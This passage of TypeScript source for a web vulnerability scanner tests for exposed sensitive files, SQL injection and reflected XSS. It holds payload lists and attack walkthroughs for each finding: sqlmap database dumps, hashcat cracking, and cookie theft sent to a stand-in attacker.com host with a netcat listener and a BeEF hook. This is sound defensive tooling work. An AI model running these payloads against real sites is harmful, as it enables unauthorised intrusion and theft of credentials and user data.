# API keys: curl -H "Authorization: Bearer JWT_SECRET" https://TARGET_URL/api/admin
# Stripe: curl https://api.stripe.com/v1/charges -u sk_live_...:

# Step 3: Outcome
# Complete database access, payment processing capability, and
# admin API access — full compromise of all backend systems`;
  }
  if (path === "/wp-config.php") {
    return `# Step 1: Confirm file is accessible
curl -s https://TARGET_URL/wp-config.php | grep -i "DB_\\|table_prefix"
# Output: define('DB_NAME', 'wordpress'); define('DB_PASSWORD', 'secretpass');

# Step 2: Connect directly to the database
mysql -h DB_HOST -u DB_USER -p DB_PASSWORD DB_NAME
SELECT user_login, user_pass FROM wp_users;

# Step 3: Crack the WordPress hash
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
# WordPress uses phpass — hashcat mode 400

# Step 4: Outcome — full WordPress admin access and database control`;
  }
  if (path === "/phpinfo.php") {
    return `# Step 1: Confirm file is accessible
curl -s https://TARGET_URL/phpinfo.php | grep -i "PHP Version\\|SERVER_ADDR\\|DOCUMENT_ROOT"

# Step 2: Extract sensitive information from the output
# - PHP version → search CVEs: https://www.cvedetails.com/product/128/PHP-PHP.html
# - DOCUMENT_ROOT → reveals server filesystem path (useful for LFI attacks)
# - Database connection info in environment variables section
# - Loaded extensions → identify attack surface (XML, SOAP, etc.)
# - disable_functions → know what is blocked on this PHP install

# Step 3: Use DOCUMENT_ROOT for Local File Inclusion (LFI)
# If another LFI vulnerability exists, use the path to traverse:
# https://TARGET_URL/page.php?file=../../../../etc/passwd`;
  }
  if (path === "/.htpasswd") {
    return `# Step 1: Fetch the credential file
curl -s https://TARGET_URL/.htpasswd
# Output: admin:$apr1$xyz$hashedpassword

# Step 2: Crack the hash with hashcat
hashcat -m 1600 htpasswd_hashes.txt /usr/share/wordlists/rockyou.txt
# Mode 1600 = Apache $apr1$ MD5 hash

# Step 3: Authenticate with cracked credentials
curl -u admin:cracked_password https://TARGET_URL/protected-area/

# Step 4: Outcome — access to HTTP Basic Auth protected resources`;
  }
  if (path.endsWith(".sql")) {
    return `# Step 1: Download the database dump
curl -s https://TARGET_URL${path} -o stolen_db.sql
wc -l stolen_db.sql   # shows how many rows/records were exposed

# Step 2: Import and query locally
mysql -u root -p < stolen_db.sql
mysql -u root -p -e "SHOW TABLES; SELECT * FROM users LIMIT 10;"

# Step 3: Crack password hashes
grep -i "INSERT INTO users" stolen_db.sql | grep -o "'[^']*'" > hashes.txt
hashcat hashes.txt /usr/share/wordlists/rockyou.txt

# Step 4: Outcome — full database contents including all user credentials,
# personal data (PII), payment history, and business data`;
  }
  return `# Step 1: Confirm file is accessible
curl -s https://TARGET_URL${path}
# Any HTTP 200 response with content is a finding

# Step 2: Analyse the content for sensitive information
curl -s https://TARGET_URL${path} | grep -i \\
  "password\\|secret\\|key\\|token\\|credential\\|user\\|admin\\|config"

# Step 3: Use the information to plan further attacks
# Server path disclosures → path traversal attacks
# Config details → targeted exploitation
# Software versions → CVE lookup`;
}

async function checkSensitiveFiles(baseUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(baseUrl);
  const base = `${parsed.protocol}//${parsed.host}`;

  const results = await Promise.allSettled(
    SENSITIVE_PATHS.map(async ({ path, label, severity, why }) => {
      try {
        const res = await fetchUrl(base + path, "GET", 5000);
        if (res.statusCode === 200 || res.statusCode === 206) {
          const contentType = headerStr(res.headers["content-type"]);
          const validation = validateSensitiveFile(path, res.statusCode, contentType, res.body);
          if (!validation.isReal) {
            return { found: false, falsePositive: true, path, reason: validation.reason };
          }
          const snippet = res.body.slice(0, 300).trim();
          return { label, severity, why, path, snippet, contentType, validation, found: true };
        }
      } catch {}
      return { found: false };
    })
  );

  let foundCount = 0;
  for (const r of results) {
    if (r.status === "fulfilled" && r.value.found) {
      const { label, severity, why, path, snippet, validation } = r.value as any;
      foundCount++;
      const confidenceTag = validation?.confidence === "high" ? "" : ` [confidence: ${validation?.confidence ?? "medium"}]`;
      findings.push({
        id: `sensitive-${label.replace(/[^a-z0-9]/gi, "-")}`,
        category: "sensitive_files",
        title: `Sensitive File Exposed: ${label}`,
        severity,
        status: "fail",
        description: why,
        detail: [
          `Path: ${path}${confidenceTag}`,
          validation?.reason ? `Validated: ${validation.reason}` : null,
          snippet ? `\nPreview:\n${snippet}` : null,
        ].filter(Boolean).join("\n"),
        recommendation:
          severity === "critical"
            ? `Immediately block access to ${path} via your web server config. Remove any sensitive files from the web root. For .git/, add 'location /.git { deny all; }' (nginx) or 'RedirectMatch 404 /\\.git' (Apache). Rotate all credentials that may have been exposed.`
            : `Block public access to ${path} in your web server or firewall rules. Verify this file is not required to be publicly accessible.`,
        execution_poc: getSensitiveFilePoc(path, label),
      });
    }
  }

  if (foundCount === 0) {
    findings.push({
      id: "sensitive-files-none",
      category: "sensitive_files",
      title: "No Sensitive Files Exposed",
      severity: "info",
      status: "pass",
      description: `Checked ${SENSITIVE_PATHS.length} common sensitive paths — none returned HTTP 200.`,
    });
  }

  return findings;
}

// ── SQL Injection ─────────────────────────────────────────────────────────────

const SQL_PAYLOADS = ["'", '"', "' OR '1'='1", `" OR "1"="1`, "1 AND 1=2", "' OR 1=1--", "';--"];

const SQL_ERROR_PATTERNS = [
  /SQL syntax.*MySQL/i,
  /MySQL.*SQL syntax/i,
  /Warning.*mysql_/i,
  /valid MySQL result/i,
  /MySqlClient\./i,
  /PostgreSQL.*ERROR/i,
  /ERROR.*PostgreSQL/i,
  /org\.postgresql\.util\.PSQLException/i,
  /ORA-\d{4,}/i,
  /Oracle error/i,
  /SQLite.*error/i,
  /sqlite3\.OperationalError/i,
  /\[Microsoft\]\[ODBC SQL Server Driver\]/i,
  /\[SQL Server\]/i,
  /Unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /com\.microsoft\.sqlserver\.jdbc/i,
  /Syntax error.*in query/i,
  /SQLSTATE\[\w+\]/i,
  /PDOException/i,
  /Query failed:/i,
];

async function checkSqlInjection(targetUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(targetUrl);
  const params = Array.from(parsed.searchParams.keys());

  if (params.length === 0) {
    findings.push({
      id: "sqli-no-params",
      category: "injection",
      title: "SQL Injection — No Query Parameters Found",
      severity: "info",
      status: "info",
      description: "The target URL has no query parameters to test for SQL injection. To test form inputs or API endpoints, provide a URL with query parameters (e.g. https://example.com/search?q=test).",
    });
    return findings;
  }

  const vulnerableParams: string[] = [];
  const evidenceMap: Record<string, string> = {};

  for (const param of params) {
    for (const payload of SQL_PAYLOADS) {
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, payload);
        const res = await fetchUrl(testUrl.toString(), "GET", 6000);
        const body = res.body;

        for (const pattern of SQL_ERROR_PATTERNS) {
          const match = pattern.exec(body);
          if (match) {
            // Secondary validation — filter documentation pages and false positives
            const secondaryCheck = validateSqlInjection(match[0], body, payload);
            if (!secondaryCheck.isReal) break; // suppressed as false positive

            if (!vulnerableParams.includes(param)) {
              vulnerableParams.push(param);
              const start = Math.max(0, match.index - 40);
              evidenceMap[param] = `Payload: ${payload}\nError snippet: ...${body.slice(start, start + 200)}...\nValidator: ${secondaryCheck.reason}`;
            }
            break;
          }
        }
      } catch {}
      if (vulnerableParams.includes(param)) break;
    }
  }

  if (vulnerableParams.length > 0) {
    findings.push({
      id: "sqli-reflected-error",
      category: "injection",
      title: "SQL Injection — Error-Based Reflected SQLi Detected",
      severity: "critical",
      status: "fail",
      description: `The server returned database error messages in response to SQL injection payloads in parameter(s): ${vulnerableParams.join(", ")}. This confirms the input is being passed to a SQL query without proper sanitisation. An attacker can extract, modify, or delete database content, and potentially achieve remote code execution.`,
      detail: Object.entries(evidenceMap).map(([p, e]) => `Parameter: ${p}\n${e}`).join("\n\n"),
      recommendation: "1. Use parameterised queries (prepared statements) — never concatenate user input into SQL strings.\n2. Use an ORM with built-in escaping.\n3. Enforce least-privilege database accounts (read-only where possible).\n4. Disable detailed database error messages in production — log errors server-side only.\n5. Apply WAF rules to block common SQLi patterns.",
      execution_poc: `# Step 1: Reproduce the error manually
curl -s "TARGET_URL&${vulnerableParams[0] ?? "id"}='" | grep -i "sql\\|error\\|syntax"
# You should see a database error message in the response

# Step 2: Extract database version with sqlmap
sqlmap -u "TARGET_URL" --dbs --batch --level=2 --risk=1
# sqlmap will auto-detect injectable parameter and enumerate databases

# Step 3: Dump users table
sqlmap -u "TARGET_URL" \\
       -D target_database \\
       -T users \\
       --dump --batch
# Output: id | username | password_hash | email | ...

# Step 4: Manual UNION-based extraction (MySQL example)
# First find number of columns:
# TARGET_URL&${vulnerableParams[0] ?? "id"}=1 ORDER BY 1--
# TARGET_URL&${vulnerableParams[0] ?? "id"}=1 ORDER BY 2--   ← error here = 1 column
#
# Then extract data:
# TARGET_URL&${vulnerableParams[0] ?? "id"}=-1 UNION SELECT username,password FROM users--

# Step 5: Outcome
# Attacker obtains full database dump including hashed/plaintext passwords
# Can authenticate as admin: https://crackstation.net/ to crack hashes`,
    });
  } else {
    findings.push({
      id: "sqli-not-detected",
      category: "injection",
      title: "SQL Injection — No Error-Based SQLi Detected",
      severity: "info",
      status: "pass",
      description: `Tested ${params.length} parameter(s) with ${SQL_PAYLOADS.length} payloads each. No SQL error patterns were detected in responses. Note: this tests only error-based SQLi — blind/time-based SQLi requires deeper testing.`,
      detail: `Parameters tested: ${params.join(", ")}`,
    });
  }

  return findings;
}

// ── XSS (Reflected) ───────────────────────────────────────────────────────────

const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  `"><script>alert(1)</script>`,
  `'><script>alert(1)</script>`,
  `"><img src=x onerror=alert(1)>`,
  `<svg onload=alert(1)>`,
  `javascript:alert(1)`,
];

// Patterns that indicate the payload was reflected unescaped in HTML
const XSS_REFLECT_PATTERNS = [
  /<script>alert\(1\)<\/script>/i,
  /"><script>alert\(1\)<\/script>/i,
  /'><script>alert\(1\)<\/script>/i,
  /"><img src=x onerror=alert\(1\)>/i,
  /<svg onload=alert\(1\)>/i,
  /javascript:alert\(1\)/i,
];

async function checkXss(targetUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(targetUrl);
  const params = Array.from(parsed.searchParams.keys());

  if (params.length === 0) {
    findings.push({
      id: "xss-no-params",
      category: "injection",
      title: "Reflected XSS — No Query Parameters Found",
      severity: "info",
      status: "info",
      description: "The target URL has no query parameters to test for reflected XSS. Provide a URL with query parameters (e.g. https://example.com/search?q=test) to enable this check.",
    });
    return findings;
  }

  const vulnerableParams: string[] = [];
  const evidenceMap: Record<string, string> = {};

  for (const param of params) {
    for (let i = 0; i < XSS_PAYLOADS.length; i++) {
      const payload = XSS_PAYLOADS[i];
      const pattern = XSS_REFLECT_PATTERNS[i];
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, payload);
        const res = await fetchUrl(testUrl.toString(), "GET", 6000);

        const contentType = headerStr(res.headers["content-type"]) ?? "";
        if (!contentType.includes("html")) continue;

        if (pattern.test(res.body)) {
          // Secondary validation — confirm payload is genuinely unescaped, not encoded
          const secondaryCheck = validateXssReflection(payload, res.body);
          if (!secondaryCheck.isReal) break; // suppressed as false positive

          if (!vulnerableParams.includes(param)) {
            vulnerableParams.push(param);
            const match = pattern.exec(res.body)!;
            const start = Math.max(0, match.index - 60);
            evidenceMap[param] = `Payload: ${payload}\nReflected in response:\n...${res.body.slice(start, start + 250)}...\nValidator: ${secondaryCheck.reason}`;
          }
          break;
        }
      } catch {}
      if (vulnerableParams.includes(param)) break;
    }
  }

  if (vulnerableParams.length > 0) {
    findings.push({
      id: "xss-reflected",
      category: "injection",
      title: "Reflected XSS — Payload Reflected Unescaped in HTML",
      severity: "high",
      status: "fail",
      description: `XSS payloads were reflected verbatim in the HTML response for parameter(s): ${vulnerableParams.join(", ")}. An attacker can craft a malicious URL that, when visited by a victim, executes arbitrary JavaScript in the victim's browser — enabling cookie theft, session hijacking, and phishing.`,
      detail: Object.entries(evidenceMap).map(([p, e]) => `Parameter: ${p}\n${e}`).join("\n\n"),
      recommendation: "1. HTML-encode all user-supplied values before rendering in HTML (e.g. replace < with &lt;, > with &gt;, \" with &quot;).\n2. Use a context-aware template engine that auto-escapes output (React JSX, Jinja2 autoescape, etc.).\n3. Set a strict Content-Security-Policy header to block inline script execution.\n4. Set X-XSS-Protection: 1; mode=block (legacy browsers).\n5. Validate and whitelist input server-side — reject or sanitise unexpected characters.",
      execution_poc: `# Step 1: Confirm reflection in browser
# Open this URL in a browser (replace TARGET_URL and PARAM with actual values):
# TARGET_URL&${vulnerableParams[0] ?? "q"}=<script>alert(document.domain)</script>
# If an alert box appears showing the domain — XSS is confirmed.

# Step 2: Steal victim's session cookie
# Craft a malicious link and send it to the victim via email/chat:
# TARGET_URL&${vulnerableParams[0] ?? "q"}=<script>
#   new Image().src='https://attacker.com/c?x='+encodeURIComponent(document.cookie)
# </script>
#
# Attacker listens with netcat:
nc -lvnp 80
# Receives: GET /c?x=session%3Dabc123; HttpOnly=...

# Step 3: Full account takeover
# With session cookie: document.cookie = "session=abc123"
# Or use EditThisCookie browser extension to inject the stolen cookie
# Refresh target page → logged in as victim

# Step 4: BeEF browser exploitation framework
# Host BeEF on attacker server, inject hook:
# TARGET_URL&${vulnerableParams[0] ?? "q"}=<script src="https://attacker.com:3000/hook.js"></script>
# Victim's browser is now hooked — attacker can run commands, take screenshots, keylog

# Step 5: Verify with Burp Suite
# Proxy > Intercept > send to Repeater
# Modify parameter to: <script>alert(1)</script>
# Check Response tab — payload appears unencoded in HTML body`,
    });
  } else {
    findings.push({
      id: "xss-not-reflected",
      category: "injection",
      title: "Reflected XSS — No Unescaped Reflection Detected",
      severity: "info",
      status: "pass",
      description: `Tested ${params.length} parameter(s) with ${XSS_PAYLOADS.length} XSS payloads each. No payload was reflected unescaped in the HTML response. Note: this covers reflected XSS only — stored and DOM-based XSS require separate testing.`,
      detail: `Parameters tested: ${params.join(", ")}`,
    });
  }

  return findings;
}

export async function runScan(targetUrl: string, crawlEnabled = false): Promise<ScanResult> {
  const parsed = new URL(targetUrl);
  const hostname = parsed.hostname;

  // ── Optional: spider the site to discover injection targets ──────────────
  let crawlResult: CrawlResult | null = null;
  let crawlSummary: CrawlSummary | null = null;

  if (crawlEnabled) {
    crawlResult = await crawl(targetUrl, { maxPages: 30, maxDepth: 3, concurrency: 5 });
    crawlSummary = {
      pagesVisited: crawlResult.pagesVisited,
      urlsDiscovered: crawlResult.urls.length,
      urlsWithParams: crawlResult.urlsWithParams,
      urls: crawlResult.urls,
      jsFiles: crawlResult.jsFiles,
      errors: crawlResult.errors,
    };
  }

  let mainFetch: FetchResult;
  try {
    mainFetch = await fetchUrl(targetUrl, "GET", 12000);
  } catch (err: any) {
    throw new Error(`Failed to connect to ${targetUrl}: ${err.message}`);
  }

  let ipAddress: string | null = null;
  try {
    const addrs = await dns.resolve4(hostname);
    ipAddress = addrs[0] ?? null;
  } catch {}

  // ── Core single-URL checks (always run on target) ────────────────────────
  const [dnsFindings, sslFindings, contentFindings, httpMethodFindings, sensitiveFileFindings, sqliFindings, xssFindings] = await Promise.all([
    checkDns(hostname),
    checkSsl(targetUrl, mainFetch),
    checkContentDiscovery(targetUrl),
    checkHttpMethods(targetUrl),
    checkSensitiveFiles(targetUrl),
    checkSqlInjection(targetUrl),
    checkXss(targetUrl),
  ]);

  const headerFindings = checkSecurityHeaders(mainFetch.headers);
  const serverFindings = checkServerInfo(mainFetch.headers);

  // ── Crawl-mode: run injection checks on every discovered URL with params ──
  const extraSqliFindings: ScanFinding[] = [];
  const extraXssFindings: ScanFinding[] = [];

  if (crawlResult && crawlResult.urlsWithParams.length > 0) {
    // Skip the root URL itself (already tested above), cap at 50 targets
    const additionalTargets = crawlResult.urlsWithParams
      .filter((u) => u.split("?")[0] !== targetUrl.split("?")[0])
      .slice(0, 50);

    const seen = new Set<string>();

    // Run in batches of 5
    const BATCH = 5;
    for (let i = 0; i < additionalTargets.length; i += BATCH) {
      const batch = additionalTargets.slice(i, i + BATCH);

      // For each URL in the batch, run SQLi + XSS in parallel
      const perUrlResults = await Promise.all(
        batch.map(async (srcUrl, batchIdx) => {
          const urlIdx = i + batchIdx;
          const [sqli, xss] = await Promise.all([
            checkSqlInjection(srcUrl),
            checkXss(srcUrl),
          ]);

          // Tag findings with source URL + unique id suffix; keep only failures
          const tag = (findings: ScanFinding[]): ScanFinding[] =>
            findings
              .filter((f) => f.status !== "pass")
              .map((f) => ({
                ...f,
                id: `${f.id}-spider-${urlIdx}`,
                title: `[Spider] ${f.title}`,
                detail: f.detail
                  ? `Found at: ${srcUrl}\n\n${f.detail}`
                  : `Found at: ${srcUrl}`,
              }))
              .filter((f) => {
                if (seen.has(f.id)) return false;
                seen.add(f.id);
                return true;
              });

          return { sqli: tag(sqli), xss: tag(xss) };
        })
      );

      for (const r of perUrlResults) {
        extraSqliFindings.push(...r.sqli);
        extraXssFindings.push(...r.xss);
      }
    }
  }

  const allFindings = [
    ...dnsFindings,
    ...sslFindings,
    ...headerFindings,
    ...serverFindings,
    ...contentFindings,
    ...httpMethodFindings,
    ...sensitiveFileFindings,
    ...sqliFindings,
    ...xssFindings,
    ...extraSqliFindings,
    ...extraXssFindings,
  ];

  const summary: ScanSummary = {
    total: allFindings.length,
    critical: allFindings.filter((f) => f.severity === "critical" && f.status !== "pass").length,
    high: allFindings.filter((f) => f.severity === "high" && f.status !== "pass").length,
    medium: allFindings.filter((f) => f.severity === "medium" && f.status !== "pass").length,
    low: allFindings.filter((f) => f.severity === "low" && f.status !== "pass").length,
    info: allFindings.filter((f) => f.severity === "info").length,
    passed: allFindings.filter((f) => f.status === "pass").length,
  };

  return {
    findings: allFindings,
    summary,
    responseTimeMs: mainFetch.responseTimeMs,
    serverInfo: headerStr(mainFetch.headers["server"]) ?? null,
    ipAddress,
    sslValid: mainFetch.sslValid ?? null,
    sslExpiry: mainFetch.sslExpiry ?? null,
    scannedAt: new Date().toISOString(),
    crawlSummary,
  };
}
